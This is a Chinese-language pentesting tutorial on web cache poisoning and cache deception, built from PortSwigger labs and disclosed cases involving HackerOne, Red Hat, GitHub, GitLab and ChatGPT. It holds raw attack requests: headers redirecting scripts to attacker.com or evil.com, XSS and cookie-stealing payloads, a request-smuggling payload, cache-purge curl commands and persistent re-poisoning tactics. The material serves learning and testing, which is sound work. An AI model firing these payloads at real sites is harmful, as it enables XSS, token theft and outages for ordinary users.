# 0x01 原理

缓存安全问题主要源于三方角色的认知不一致：**客户端**、**缓存层（CDN/代理）**、**后端服务器（Origin）**。

------

## 1.1 Web Cache Poisoning (缓存投毒)

**核心原理：利用“非缓存键”误导缓存。**

缓存服务器为了效率，不会根据请求的所有内容来区分资源，而是提取几个关键字段生成一个 **Cache Key**（通常是 `Method + Host + Path`）。

- **Keyed Input（缓存键）**：包含在 Cache Key 里的字段。
- **Unkeyed Input（非缓存键）**：不包含在 Key 里，但能改变页面内容的字段（如特定的 Header）。

### 攻击逻辑：

1. **发送恶意请求**：攻击者发送一个包含“非缓存键”的请求。例如，Header 里带上 `X-Forwarded-Host: <script>alert(1)</script>`。
2. **后端响应**：后端服务器如果信任这个 Header，并将其反射到页面中，就会返回一个带有 XSS 脚本的响应。
3. **缓存存入**：缓存层发现这个请求的 Key（`GET /index.php`）在库里没有，于是把这个带有恶意脚本的响应存入 **`/index.php`** 这个桶里。
4. **受害者中招**：普通用户访问正常的 `GET /index.php`（不带任何特殊 Header）。缓存层一看：Key 对上了！直接把那个带毒的响应发给了普通用户。

------

## 1.2 Web Cache Deception (缓存欺骗)

**核心原理：利用“路径解析差异”诱导缓存。**

这与投毒相反：投毒是想让别人看到**我的**恶意内容，欺骗是想让缓存存下**别人的**私密内容。

### 攻击逻辑：

1. **构造特殊路径**：攻击者诱导受害者点击一个经过伪装的链接，例如：`https://vulnerable.com/api/user/settings/avatar.jpg`。
2. **认知偏差**：
   - **缓存层（CDN）**：看到路径以 `.jpg` 结尾，认为这是个**静态资源**，应该缓存。
   - **后端服务器**：解析路径时，可能因为 Web 框架特性（如 Django 或 Spring）忽略掉不存在的后缀，认为用户请求的是 `/api/user/settings`。
3. **响应缓存**：后端返回了受害者的个人敏感设置（JSON 格式）。CDN 却把这份 JSON 当作“图片”存进了 `/avatar.jpg` 的缓存桶里。
4. **攻击者窃取**：攻击者现在直接访问该 `.jpg` 路径，CDN 就会把存好的受害者私密 JSON 直接吐给攻击者。

------

# 0x02 Web Cache Poisoning (缓存投毒) 实施步骤

## 第一阶段：识别缓存机制

在动手攻击前，首要任务是识别目标是否开启了缓存服务。这决定了后续攻击是否具备“媒介”。

### 1.  **有缓存提示（指示性 Header）**
通常响应头会直接暴露缓存状态，可参考 [HTTP Cache headers](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-web/special-http-headers.html#cache-headers)：
* **识别架构**：查看 `Server` 字段（如 `cloudflare`, `varnish`）或 `Via` 字段。
* **分析指标**：
  * `X-Cache: hit`：资源由缓存直接返回。
  * `X-Cache: miss`：资源未命中，已回源。
  * `Age`：资源在缓存中已存在的时长。
  * `Cache-Control`：关注 `public`（可缓存）与 `max-age`（有效期）。

### 2. **无缓存提示（行为探测）**
* **错误诱导测试**：发送非法 Header 强制触发 **400 Bad Request**。
* **验证持久性**：立即再次正常访问。若正常访问也返回 **400**，说明错误响应已被缓存。

---

## 第二阶段：识别缓存键和非缓存键（Key Analysis）

这一阶段的目标是摸清缓存服务器的“解析逻辑”：哪些变量决定了缓存桶（Key），哪些变量能改变页面内容却不被记录（Unkeyed）。可以使用工具 [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)。

### 1. 识别缓存键（Cache Key）

缓存键是服务器用来识别请求的“指纹”，通常包含 `Method + Host + Path`。

* **参数探测法**：改变 Query 参数（如 `?cb=123`）。
  * 若 `?cb=123` 导致 `miss`，而再次请求变 `hit`，说明 **Query Parameter 是 Cache Key 的一部分**。

* **分块解析测试**：测试特定字符（如 `;` 或 `?`）是否会导致缓存服务器与后端服务器的路径解析不一致。

### 2. 识别非缓存键（Unkeyed Inputs）

寻找能改变页面内容，但**不会**改变缓存键的隐藏变量。

* **自动化盲测**：使用 `Param Miner` 插件批量测试 Header。
* **观察反射与干扰**：
  * 发送 `X-Forwarded-Host: evil.com`。
  * 若页面源码中出现了 `evil.com`（反射成功），且响应头仍显示 `X-Cache: hit`（说明未改变 Key），则找到了**理想的非缓存键**。
* **常见的非缓存键**：
  - `X-Forwarded-Host: attacker.com`
  - `X-Forwarded-Scheme: http`
  - `X-HTTP-Method-Override: HEAD`
  - `Content-Type: application/xml`
  - `User-Agent: <script>alert(1)</script>`

---

## 第三阶段：漏洞利用构造（Exploitation）

根据找到的“非缓存键”反射位置，构造 Payload。

1. **反射型 → 存储型 XSS**：将 Header 里的反射升级为针对所有访问该路径用户的 XSS。
2. **资源重定向**：篡改 `X-Forwarded-Host` 等，使页面加载攻击者域名下的恶意 JS/CSS。
3. **缓存 DoS**：注入超长 Header 或非法字符，使缓存服务器存入并分发 `400/500` 错误页面，导致服务瘫痪。

---

## 第四阶段：播种投毒（Cache Seeding）

确保恶意响应成功覆盖正常的缓存内容。

1. **同步 Vary 维度**：若存在 `Vary: User-Agent`，投毒请求的 UA 必须与目标受害者匹配。
2. **抢占失效窗口**：观察 `Age` 字段，在缓存即将过期（接近 `max-age`）时发送 Payload 请求。
3. **多点验证**：更换不同地域的代理 IP 访问 URL，确认恶意内容已在全球/区域节点生效。

---

## 第五阶段：持久化与放大（Optional）

1. **循环重播**：编写脚本在缓存到期前自动重刷 Payload，实现永久污染。
2. **跨站污染**：若 CDN 存在配置缺陷（如忽略 Host 大小写），尝试通过一个域名的漏洞污染共享缓存池的其他域名。

---

# 0x03 Web Cache Poisoning (缓存投毒) 攻击

### 3.1 基础攻击向量

#### 3.1.1  **基础头部反射 (Header Reflection)**

- **X-Forwarded-Host**: 用于模板化重定向或规范 URL。如 HackerOne 案例，通过该 Header 强制缓存存储指向恶意域名的 301 重定向。
- **X-Forwarded-Scheme**: 干扰 HTTPS 强制跳转逻辑，造成重定向死循环或降级攻击。
- **X-Host**：可能被用于加载某些静态资源，如 JS 资源

- **其他头部**：[Header 字典](./assets/header.txt)

---

#### 3.1.1.1 基础攻击向量一：`X-Forwarded-Host`

`X-Forwarded-Host` 触发 `301` 转跳，缓存服务器缓存 301 响应。对`/assets/main.js` 请求将会被替换攻击者控制的内容。

```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

```

---

#### 3.1.1.2 基础攻击向量二：`X-Forwarded-Host` + `X-Forwarded-Scheme`

将 `X-Forwarded-Scheme` 设置为 `http`，由于服务器会将所有 `HTTP` 请求重定向到 HTTPS，在重定向时使用 `X-Forwarded-Host` 作为重定向的域名，缓存服务器缓存了指向恶意地址的 `301` 响应。

```http
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http

```

---

#### 3.1.1.3 基础攻击向量三：`X-Host` 

**`X-Host`** 头可能被用作 **加载 JS 资源的域名**

```http
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com

```

---

#### 3.1.1.4 案例一：HackOne host spoofing

HackOne 后端使用 `X-Forwarded-Host`进行重定向和规范 URL，但缓存键仅使用了 `Host` 头，因此单个响应就毒害了所有访问 `/` 的访客。

```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com

```

---

#### 3.1.1.5 案例二：HackOne scheme spoofing

HackOne 后端信任 `X-Forwarded-Scheme`来决定是否强制使用 HTTPS，设置`X-Forwarded-Scheme: http`，由于后端强制使用 HTTPS 的关系，可触发 301 转跳。

```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http

```

---

#### 3.1.1.6 案例三：Red Hat Open Graph meta poisoning

1. Red Hat 的页面在生成 HTML 时，会为了 SEO 或社交分享的需求，动态构建 Open Graph 标记（例如 `<meta property="og:url" content="...">`）。
2. 服务器后端错误地信任了 `X-Forwarded-Host` 头部。攻击者传入 `a."?><script>alert(1)</script>`，后端会未加过滤地将其拼接到 HTML 标签中。
3. 缓存服务器缓存反射型 XSS 响应，从而变成存储型 XSS

```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>

```

---

### 3.1.2 **内容处理滥用**

- **Content-Type 注入**: 注入非法 Content-Type 触发后端 400 错误，若缓存未校验状态码，会导致页面全局 DoS（如 GitHub 案例）。
- **Method Override**: 利用 `X-HTTP-Method-Override: HEAD` 诱导缓存存储 Content-Length 为 0 的空响应（如 GitLab 案例）。

---

#### 3.1.2.1 案例一：GitHub `Content-Type`异常导致 `400` 响应

该案例只要针对匿名用户：

- **已登录用户（Authenticated）：** 为了安全和个性化，缓存键通常会包含 Session ID 或 Cookie。这意味着每个人的缓存都是隔离的。
- **未登录用户（Anonymous）：** 为了性能，所有匿名用户共享同一个缓存键。

攻击过程：

1. 通过 `PURGE` 请求方法清除健康缓存

   ```bash
   curl -X PURGE https://github.com/user/repo
   ```

2. 构造异常的 `Content-Type`出发 `400` 错误，缓存服务器缓存 `400` 响应。

    ```bash
    curl -H "Content-Type: invalid-value" https://github.com/user/repo
    ```

---

#### 3.1.2.2 案例二：GitLab`X-HTTP-Method-Override`方法覆盖

GitLab 从 Google Cloud Storage 提供静态 bundle。Google Cloud Storage 遵从通过 `X-HTTP-Method-Override`指示将 `GET` 覆盖为 `HEAD` ，导致返回空响应并被缓存服务器存储。

```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD

```

---

### 3.1.3 **底层解析差异**

- **分隔符/规范化差异**: CDN 不解码 `%2F` 但后端解码，通过 `/share/%2F..%2Fapi/auth/session` 将敏感 API 响应诱骗至缓存目录（如 ChatGPT 案例）。
- **大小写混淆**: Cloudflare 等 CDN 规范化 Host 为小写进行缓存，但转发至后端时保持原样，利用后端对 `Host: TaRgEt.CoM` 的特殊处理实现投毒。

---

#### 3.1.3.1 攻击向量一：分隔符/URL 规范化差异

##### 分隔符差异

Ruby 等支持`;`分隔参数的服务器，可将非缓存键参数隐藏在合法参数内。

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

```http
GET /page.php?param=value;malicious=value HTTP/1.1
Host: target.com

```

---

##### URL 规范化差异

- CDN 会缓存特定目录下的所有内容，如：`/share/`
- CDN 不会解码或规范化 `%2F..%2F`，因此它可以被用作 **path traversal to access other sensitive locations that will be cached**，例如 `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Web server 会解码并规范化 `%2F..%2F`，并会返回 `/api/auth/session`，该响应 **contains the auth token**。

> 更多详见：[URL 路径解析差异](./URL 路径解析差异.md)

---

#### 3.1.3.2 攻击向量二：大小写混淆

通过 `Host` 大小写混淆，导致 **CDN 层**和**源站层**出现解析差异。源站层可能返回 400 响应或其他响应，致使缓存被污染。

著名案例：**Cloudflare** 

- **Cloudflare (CDN 层)：** 为了提高缓存命中率，它会对 `Host` 头进行**规范化（Normalization）**处理。无论你发送 `TaRgEt.CoM` 还是 `target.com`，Cloudflare 都会将其视为同一个缓存键（Cache Key），并指向同一个缓存桶（Cache Bucket）。

- **Origin (源站层)：** 源站（如 Nginx、Apache 或后端应用框架）在接收请求时，可能会直接读取 **原始（Raw）** 的 Header。如果程序员在代码中使用了类似 `if (request.headers['Host'] == 'target.com')` 这种大小写敏感的判断，逻辑就会出现偏差。

---

## 3.2 高级攻击变种

### 3.2.1 **参数操纵 (Parameter Manipulation)**

- **Fat GET**: 在 GET 请求的 Body 中携带参数。若缓存仅看 URL 而后端优先看 Body，可导致缓存响应被参数污染。

---

#### 3.2.1.1 攻击向量一：Fat GET

服务器使用 Body 中的参数，但缓存系统仅依据 URL 缓存

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim  # 服务器使用此值，缓存使用URL中的值

```

---

### 3.2.2 **复合型利用**

- **并行请求播种 (Cache Seeding)**：针对 User-Agent 反射，通过单包并行发送恶意 UA 请求与正常请求，利用竞争条件污染 HTML 缓存。
- **Sitecore XAML 投毒**: 利用特定的 XAML 处理程序 `AddToCache` 实现未授权的 HtmlCache 写入。
- **Request Smuggling 结合**: 利用走私漏洞将恶意响应“对齐”到下一个正常用户的缓存键上。

---

#### 3.2.2.1 攻击向量一：并行请求播种 (Cache Seeding)

1. 存在一个 **Header 反射**，能够触发 XSS 攻击
2. CDN 自动缓存 URL 以`.js` 结尾的响应
3. 通过 Single-packet attack 触发条件竞争
   - **请求 A**：`GET /index.php/.js` (带恶意 UA)
   - **请求 B**：`GET /` (正常请求)

极端高并发下，CDN 内部的缓存处理逻辑可能会发生如下“事故”：

1. CDN 接收到请求 A，由于后缀是 `.js`，它标记该请求为“可缓存的”。
2. 与此同时，请求 B 到达，CDN 识别出这对应主页 `/`。
3. **竞争发生**：如果 CDN 的并发控制机制不够健壮，它可能会将请求 A（带毒）从源站拿回的响应，错误地填入到请求 B（主页）所指向的缓存槽位

```http
GET /script.js HTTP/1.1
Host: cdn.target.com
User-Agent: "><script>stealCookies()</script>

```



---

#### 3.2.2.2 攻击向量二：Sitecore XAML 投毒

与之前讨论的利用 CDN 机制的“被动”投毒不同，这个漏洞是直接利用了 Sitecore 框架内部的一个**未授权（Pre-auth）远程过程调用（RPC）**，强行把恶意数据“写”进服务器的内存缓存中。

我们可以从以下四个维度来拆解这个攻击链：

------

##### 1. 攻击入口：XAML 处理器 (The Pre-auth Entry)

Sitecore 作为一个复杂的 CMS 框架，为了支持后台 UI 交互，提供了一些特殊的 Handler。

- **漏洞点**：`/-/xaml/Sitecore.Shell.Xaml.WebControl`。
- **特性**：这个接口原本是给管理员后台（Shell）使用的，但开发者在配置时，允许了**未授权访问**（Pre-auth）。这意味着任何人（甚至匿名用户）都能向这个接口发送 POST 请求。

##### 2. 漏洞原语：不安全的反射调用 (The Insecure Reflection)

这是该漏洞最精彩的部分。Sitecore 的 `AjaxScriptManager` 允许通过 HTTP 参数触发后端组件的方法。

- **触发逻辑**：当请求中包含 `__ISEVENT=1` 且指定了 `__SOURCE`（即特定的控制 ID）时，Sitecore 的逻辑会尝试在对应的 WebControl 对象上执行 `__PARAMETERS` 中定义的方法。
- **利用点**：攻击者发现 `GlobalHeader` 控件继承自 `WebControl`，而 `WebControl` 内部刚好有一个名为 **`AddToCache`** 的公共方法。

##### 3. 精确投毒：手动构建 Cache Key

在普通的缓存污染中，我们只能寄希望于 CDN 按照它的规则去存。但在 Sitecore 这个漏洞里，你是**主动写入者**：

- **`AddToCache("key", "value")`**：
  - **key**：这是你想要投毒的目标页面的缓存键。攻击者需要通过研究 Sitecore 的源码，推导出目标页面（如登录页或首页）生成的 Cache Key 算法。
  - **value**：你想要注入的恶意 HTML 代码（例如一个伪造的登录表单，或者一段窃取凭据的 JS）。

---

#### 3.2.2.3 攻击向量三：Request Smuggling 结合

`/post/next?postId=3`会触发重定向，并使用 `Host: attacker.net` 作为重定向的目标。发送请求走私攻击后立刻访问某个静态资源，如：`/static/include.js`。随后，对 `/static/include.js` 的任何请求都会返回 `302` 重定向，获取缓存的攻击者脚本内容。

```http
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

---



# 0x04 Web Cache Deception (缓存欺骗)攻击

## 1. 路径混淆技巧 (Path Confusion)

- **扩展名欺骗**: 在动态接口后添加静态后缀，如 `/profile.php/nonexistent.css`。
- **分隔符变体**:
  - 使用 `;` 绕过：`/profile.php;admin.js`。
  - 使用 URL 编码绕过：`/profile.php%2f..%2fsecret.js`。
- **冷门扩展名**: 测试 `.avif`、`.webp`、`.woff2` 等 CDN 可能默认缓存但安全策略未覆盖的格式。

## 2. 高级复合攻击

- **CSPT 辅助攻击 (Client-Side Path Traversal)**:
  - 在 SPA（单页面应用）中，利用客户端路径穿越让前端脚本向 `/v1/token.css` 发起带认证头的请求。
  - CDN 因后缀名缓存该响应，攻击者随后通过公共链接提取受害者 Token。

# 0x05 工具

| **分类** | **工具名称**        | **实战用途**                                  |
| -------- | ------------------- | --------------------------------------------- |
| **发现** | **Param Miner**     | Burp 插件，自动探测隐藏的未键入 Header 和参数 |
| **综合** | **WCVS**            | 自动检测 Web 缓存投毒与欺骗的扫描器           |
| **欺骗** | **CacheDecepHound** | 专门针对缓存欺骗路径混淆的探测工具            |
| **注入** | **toxicache**       | Go 编写的批量缓存漏洞扫描器                   |
